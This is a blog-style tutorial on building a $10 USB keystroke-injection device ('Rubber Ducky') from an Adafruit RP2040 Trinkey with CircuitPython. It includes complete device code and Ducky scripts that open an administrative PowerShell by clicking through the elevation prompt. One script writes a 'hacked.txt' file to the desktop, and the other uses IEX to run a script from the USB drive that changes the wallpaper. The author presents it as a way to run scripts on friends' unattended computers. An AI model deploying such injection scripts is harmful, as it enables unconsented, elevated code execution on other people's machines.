---
tags: []
---
Ever wanted to prank someone by changing their wallpaper or running a script when they walk away from their computer? It's a lot easier than you think! I will show you how to create your own USB Rubber Ducky for just \$10, a fraction of the cost of Hak5's \$70 Rubber Ducky!

We'll use the **Adafruit Trinkey QT2040 - RP2040** and CircuitPython to make a fully functional "keyboard injection" tool that can automate tasks, execute scripts, and more.

---
## Materials You'll Need

1. [Adafruit Trinkey QT2040 - RP2040](https://www.adafruit.com/product/5056)
2. A computer with USB ports.
3. Basic programming tools like a text editor.

---

## Step 1: Set Up CircuitPython

1. **Download CircuitPython**  
    Visit the [Adafruit CircuitPython page](https://circuitpython.org/board/adafruit_qt2040_trinkey/) and download the latest `.uf2` file for the QT2040 Trinkey.  (**9.2.1**)
    ![CircuitPython Download](image1.png)
    
2. **Put the Trinkey into Bootloader Mode**
    - Hold down the **BOOT/BOOTSEL** button (red in the image below).
![[buttons.jpg]]
    - While holding, press and release the **Reset** button (blue) and connect the Trinkey to your computer.
    - Continue holding the **BOOT/BOOTSEL** button until the `RPI-RP2` drive appears.  
        ![Bootloader Mode](image2.png)
3. **Copy the `.uf2` File**  
    Drag and drop the `.uf2` file onto the `RPI-RP2` drive. The device will restart, and you should now see a new drive labeled `CIRCUITPY`.  
    ![Drive Ready](image3.png)
    
4. **Prepare for Coding**
    - If you are missing a file named `code.py` on the `CIRCUITPY` drive, create it.
    - If you are missing a folder named `lib` inside the `CIRCUITPY` drive, create it.  
    - Create a folder named `scripts` inside the `CIRCUITPY` drive for our scripts.
	![[image.png]]

---

## Step 2: Safe Mode

By default, the USB will try to run code every time you plug it in to a device (duh!). While we work on it we don't want this, because it will also run anytime one of it's files changes. To bypass this, when you plug in the device click the `RESET` button twice and the device should flash yellow 3 times, signaling it is in Safe mode. If you need a refresher on which button that is, please look at Step 1 again.

---

## Step 3: Install Necessary Libraries

1. Download the **CircuitPython 9.x Library Bundle** from [Adafruit Libraries](https://circuitpython.org/libraries).
2. Extract the bundle and copy these files to your `CIRCUITPY` drive:
    - **`adafruit_hid`** folder (for USB HID functionality)
    - **`adafruit_ducky.mpy`** (for Rubber Ducky script support, place this in the `lib` folder).

---

## Step 4: Write our `code.py`

Open the `code.py` file and paste in the following Python code:

```python
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keyboard import Keyboard
import adafruit_ducky
import usb_hid
import time

time.sleep(1)

keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

duck = adafruit_ducky.Ducky("scripts/ducky.txt", keyboard, keyboard_layout)

while True:
    result = duck.loop()
    if not result:
        break
```

**Code Explanation**
We first import the libraries we installed when we copied over the files to `lib`. Then we have the USB sleep for a second to let it boot up. We create a `Keyboard` object and a `KeyboardLayoutUS` from the `Keyboard` object. We can then create a `Ducky` object from those two, and we point it to where our ducky script will be on the drive.

Now that we have our variables, we then loop through the ducky script line by line until the script ends!

---

## Step 5: Writing the Ducky Script

1. Create a new file called `ducky.txt` inside of our `scripts` folder on the `CIRCUITPY` drive and paste this in:
```
GUI x
DELAY 500
STRING a
DELAY 500
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 500
ENTER
DELAY 1000
STRING echo "you've been hacked!" > ([Environment]::GetFolderPath("Desktop") + "\hacked.txt"); exit;
ENTER
```
2. This script opens an administrative PowerShell session on Windows 11 and creates a text file on the desktop named `hacked.txt`. This takes about ~5 seconds to execute on my laptop.
![Ducky Script Showcase](video1.mp4)

Try it out! Unplug your USB and plug it back in to see it work!

---

## Advanced Use Case: Changing the Wallpaper

Now that you've had a taste! Let's try doing some funny PowerShell stuff!

Find a funny image you want to make your friends wallpaper. I'm going to use this one:
![[wallpaper.jpg]]

Create a new folder on your `CIRCUITPY` called `resources` and put your image there! Make sure it's named `wallpaper.jpg`.
### Step 1: PowerShell Time!

Create a new text file in `scripts` called `iexscript.txt` on the `CIRCUITPY` drive and paste the following in:

```powershell
$WallpaperPath = ((Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter + ":\resources\wallpaper.jpg")

Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

[Wallpaper]::SystemParametersInfo(0x0014, 0, $WallpaperPath, 0x01 -bor 0x02)
exit
```

**Code Explanation**
This is a simple PowerShell script that we are going to call with our ducky script! It creates a C# object that contains code to replace a user's wallpaper and then calls it in PowerShell!
### Step 2: Back to `ducky.txt`!

Open your `ducky.txt` inside of your `scripts` folder in the `CIRCUITPY` drive, delete what you have and paste in the following:
```
GUI x
DELAY 500
STRING a
DELAY 500
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 500
ENTER
DELAY 1000
STRING IEX (Get-Content ((Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter + ":\scripts\iexscript.txt") -Raw);
ENTER
```

This code will (again) open an administrative PowerShell, but this time it will use `IEX`. Essentially `IEX` will execute the statement after it, and the whole `Get-Content` thing basically finds our cool `iexscript.txt` file on our USB and give it to `IEX` and `IEX` runs it! **Make sure you have a `resources` folder and a `wallpaper.jpg` file inside of it or this script will not work!**

Try it out! Unplug your USB and plug it in to see it work!

![Wallpaper Showcase](video2.mp4)

---

Congratulations! You're now a master hacker and can prank your friends by changing their wallpaper!

---

Please reach out to me if you have any comments or feedback! Contact: [sstock2005.business@gmail.com](mailto:sstock2005.business@gmail.com)